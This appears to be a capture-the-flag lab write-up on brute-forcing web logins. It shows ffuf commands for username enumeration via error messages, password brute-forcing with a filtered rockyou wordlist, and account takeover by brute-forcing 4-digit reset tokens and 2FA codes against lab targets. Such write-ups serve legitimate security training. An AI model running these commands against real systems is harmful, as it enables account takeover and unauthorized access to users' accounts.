# 🏍️ Brute-Force Attacks

## Enumerating Users

User enumeration vulnerabilities arise when a web application responds differently to registered/valid and invalid inputs for authentication endpoints

Let's imagine those 2 errors:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>User does not exist</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Just a wrong password </p></figcaption></figure>

To enumerate users via error messages, we will use the `xato-net-10-million-usernames.txt`

Let's imagine the following error message:

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

we can filter out invalid users by removing responses containing the string `Unknown user`

```shell-session
ffuf -w /opt/useful/SecLists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

And when we identify a valid user, we can proceed to do bruteforce

_**Enumerate a valid user on the web application. Provide the username as the answer.**_

```
fuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.56.194:35890/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Brute-Forcing Passwords

Let's imagine we got password policy going on and we're not sure about lockout policy, we can create wordlists according to the policy from famous wordlists to reduce noise:

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```shell-session
ElFelixi0@htb[/htb]$ grep '[[:upper:]]' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

Once we got our user or our list of users and our post variable as well as the error messgae, we can start bruteforcing ->

```
ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

_**What is the password of the user 'admin'?**_

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
ffuf -w custom_wordlist.txt -u http://94.237.53.113:46749/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Password Reset Tokens

Many web applications implement a password-recovery functionality if a user forgets their password that often utilizes a one-time reset token via SMS or email.

Here is a a basic password reset flow

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

To start exploiting this, let's imagine we created an account on the website and asked for a new password and received this type of email:

```
<SNIP>
paste the following URL into your web browser: http://weak_reset.htb/reset_password.php?token=7351
<SNIP>
```

We can see that we get the token is `7351`. Given that the token consists of only a 4-digit number, there can be only `10,000` possible values&#x20;

So let's start by making our list of possible tokens:

```shell-session
seq -w 0 9999 > tokens.txt
```

and then launch our attack and all ports, thus attacking every user that is currently resseting their password

```shell-session
ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

_**Takeover another user's account on the target system to obtain the flag.**_

```
ffuf -w ./tokens.txt -u http://94.237.50.83:58664/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 2FA Codes

Generally this is achieved by combining knowledge-based authentication (password) with ownership-based authentication (the 2FA device)

most of the time, it relies on the user's password and a time-based one-time password (TOTP) provided to the user's smartphone by an authenticator app or via SMS that are typically **only of digits**

Let's say we have a set of credentials and there is 2FA:

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If we capture the request we can see the follwoing:

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>only <code>10,000</code> possible variations</p></figcaption></figure>

So let's start by crafting our wordlist, then our payload:

```shell-session
seq -w 0 9999 > tokens.txt
```

We can't forget the error message:&#x20;

```shell-session
ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

_**Brute-force the admin user's 2FA code on the target system to obtain the flag.**_

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
ffuf -w tokens.txt -u http://94.237.56.194:54467/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=d3ng2r9pippot860ural3jls64" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
